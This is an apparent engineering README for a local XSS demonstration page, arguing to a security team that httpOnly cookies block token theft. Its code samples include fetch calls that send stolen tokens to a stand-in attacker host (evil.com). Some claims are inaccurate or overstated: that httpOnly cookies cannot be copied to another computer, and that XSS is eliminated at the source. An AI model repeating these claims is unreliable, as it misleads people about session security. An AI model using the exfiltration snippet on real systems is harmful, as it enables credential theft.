# How to Run the XSS Attack Demonstration

## 🎯 Purpose

This demonstration proves that **httpOnly cookies cannot be accessed via JavaScript**, even with XSS attacks. This addresses the security team's concerns about token theft.

---

## 📋 Prerequisites

1. **Backend server running** on `http://localhost:3000`
2. **Frontend dev server running** on `http://localhost:5173`
3. **(Optional) A user account** - Some tests work better when logged in, but all tests can run without authentication

---

## 🚀 How to Run

### Step 1: Start the Application

```bash
# Terminal 1: Start backend
cd server
npm run dev

# Terminal 2: Start frontend
cd ..
npm run dev
```

### Step 2: Open the Security Demo Page

Navigate to: **http://localhost:5173/security-demo**

### Step 3: (Optional) Log In

For the most complete demonstration:
1. Go to **http://localhost:5173/login**
2. Create an account or log in
3. Return to **http://localhost:5173/security-demo**

### Step 4: Run the Attacks

Click the **"🎯 Run All XSS Attacks"** button.

The page will simulate 8 different XSS attack attempts:

1. **Direct Cookie Access** - Try to read `document.cookie`
2. **localStorage Theft** - Try to steal tokens from localStorage
3. **sessionStorage Theft** - Try to steal tokens from sessionStorage
4. **Enumerate All Storage** - List all storage keys
5. **Steal and Exfiltrate** - Simulate sending data to attacker's server
6. **Cookie Property Access** - Try to access specific cookies by name
7. **Intercept Network Requests** - Try to intercept fetch calls
8. **Iframe Cookie Access** - Try to access cookies via hidden iframe

**BONUS:** Prove that cookies ARE automatically sent with requests, but JavaScript never accesses them.

---

## ✅ Expected Results

### All Attacks Should FAIL (Green)

```
✅ Attacks Blocked: 8-9
❌ Security Breaches: 0
```

Each attack result will show:
- ✅ **Green** = Attack blocked (Good!)
- ❌ **Red** = Security breach (Bad!)

You should see messages like:
- `✅ SECURE: document.cookie returned empty string (httpOnly cookies are hidden)`
- `✅ SECURE: No tokens found in localStorage (using httpOnly cookies instead)`
- `✅ SECURE: Cannot access 'better_auth.session_token' cookie (httpOnly protection)`

---

## 🔍 What This Proves

### The Old System (Spring Boot + localStorage)

```javascript
// ❌ VULNERABLE
localStorage.setItem('accessToken', 'eyJhbGc...');

// Attacker's XSS attack:
const token = localStorage.getItem('accessToken');  // ← SUCCESS! Token stolen
fetch('http://evil.com/steal', { body: token });    // ← Token sent to attacker

// Result: Hacker can use token for 5-15 minutes
```

**Security team's solution:** Short token expiration (5-15 min) ✅ Correct!

### The New System (Better Auth + httpOnly Cookies)

```javascript
// ✅ SECURE
// Token stored in httpOnly cookie by backend automatically

// Attacker's XSS attack:
const token = document.cookie;  // ← FAILS! Returns empty string
fetch('http://evil.com/steal', { body: token });  // ← Sends nothing

// Result: Hacker gets nothing. Attack fails at step 1.
```

**Security team's solution:** Not needed - attack prevented entirely ✅ Better!

---

## 📊 Comparison Table

| Attack Method | localStorage JWT | httpOnly Cookie |
|--------------|------------------|-----------------|
| XSS can steal token | ❌ Yes | ✅ No |
| Token accessible via JS | ❌ Yes | ✅ No |
| Attacker can use remotely | ❌ Yes (5-15 min) | ✅ No token to steal |
| Defense mechanism | Short expiration | httpOnly flag |
| User experience | Poor (frequent logouts) | Excellent (stay logged in) |

---

## 💬 For Security Team Discussion

### Your Concern (Valid!)

> "If XSS occurs, attacker steals token and uses it until expiration. 5-minute tokens limit damage to 5 minutes."

**For localStorage JWT: ✅ 100% Correct!**

### But We've Changed the Architecture

> "We now use httpOnly cookies which prevent JavaScript from accessing the token at all. The XSS attack you're protecting against fails at step 1."

**For httpOnly cookies: ✅ Attack prevented entirely!**

### What About Physical Access?

> "What if attacker sits at unlocked computer with active session?"

**Solution: Fresh session requirements for sensitive operations**

```typescript
// Backend configuration
session: {
  expiresIn: 60 * 60 * 24,  // 24 hours
  freshAge: 60 * 5,          // 5 minutes

  // Sensitive operations require session < 5 minutes old:
  // - Change password → Must re-authenticate
  // - Delete account → Must re-authenticate
  // - Transfer money → Must re-authenticate
}
```

**Result:** Attacker at physical computer cannot perform sensitive actions without knowing the password.

---

## 🎥 Demo Script for Security Team Meeting

**1. Show the old vulnerability (localStorage):**
```javascript
// Open browser console on any site that uses localStorage JWT
localStorage.getItem('token');  // Returns token - vulnerable!
```

**2. Show the new security (httpOnly cookies):**
```javascript
// Open browser console on http://localhost:5173/security-demo
document.cookie;  // Returns empty string - secure!
```

**3. Run all attacks:**
- Click "Run All XSS Attacks"
- Show that all 8 attacks fail
- Show the BONUS test proving cookies ARE sent automatically

**4. Explain the key point:**
> "Your 5-minute recommendation was perfect for localStorage JWT. But httpOnly cookies solve the XSS problem at the source. The vulnerability you were protecting against no longer exists."

**5. Show the compromise for physical access:**
> "For physical access concerns, we've implemented 5-minute fresh session requirements for sensitive operations. An attacker at an unlocked computer would need the user's password to change settings."

---

## 📚 Documentation References

- `LOCALSTORAGE_VS_HTTPONLY_SECURITY.md` - Complete technical analysis
- `SECURITY_TEAM_RESPONSE.md` - Industry benchmarks and recommendations
- `PHYSICAL_ACCESS_SECURITY.md` - Addressing remaining concerns

---

## ❓ Common Questions

### Q: Can't an attacker just copy the cookie from DevTools?

**A:** No! httpOnly cookies are visible in DevTools, but:
1. JavaScript cannot read them (XSS fails)
2. Cannot be copied to another computer
3. Only usable in the same browser on the same device

### Q: What about network interception?

**A:** Prevented by HTTPS + Secure flag:
```
Set-Cookie: token=xxx; Secure  ← Only sent over HTTPS
```

### Q: What if someone has physical access to the computer?

**A:** Fresh session requirements:
- Browsing data: Accessible (expected)
- Sensitive operations: Require password re-entry
- Short expiration doesn't help (attacker is at the actual computer)

### Q: How is this different from our Spring Boot system?

**A:**
- **Old:** Token in localStorage → JavaScript can read → XSS steals token
- **New:** Token in httpOnly cookie → JavaScript cannot read → XSS fails

---

## ✅ Success Criteria

After running the demonstration, security team should see:

1. ✅ All 8 XSS attacks fail
2. ✅ No tokens accessible via JavaScript
3. ✅ Cookies automatically sent with requests (bonus test succeeds)
4. ✅ httpOnly protection works as designed

**Conclusion:** httpOnly cookies provide superior security compared to localStorage JWT, making the 5/15-minute token expiration unnecessary. The attack vector that short expiration was protecting against is now eliminated at the source.

---

**Questions?** Contact the engineering team for a live demonstration or further clarification.
